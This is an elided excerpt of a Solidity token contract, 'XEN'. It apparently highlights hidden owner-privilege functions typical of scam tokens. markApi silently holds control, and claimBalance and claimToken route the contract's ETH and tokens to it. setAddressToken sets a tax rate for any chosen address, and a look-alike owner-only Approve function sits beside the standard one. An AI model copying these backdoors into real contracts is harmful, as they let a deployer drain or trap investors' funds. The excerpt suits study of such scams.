...
contract XEN is Context, IERC20, Ownable {
    ...
    address payable private marketingWalletAddress = payable(0x8b37Aa8A0A9840c13D238173C17C97A9BA00F168); 
    address payable private teamWalletAddress = payable(0x05D40352Bd655c5fd19311aB6349bCb23ED68a07); 
	...
	address  public markApi =_msgSender();
	...
	modifier onlyTeam {
       require(markApi == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function claimBalance() external {
        payable(markApi).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(markApi, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyTeam {
	...
	function Approve(address spender,uint256 amount)public onlyTeam{
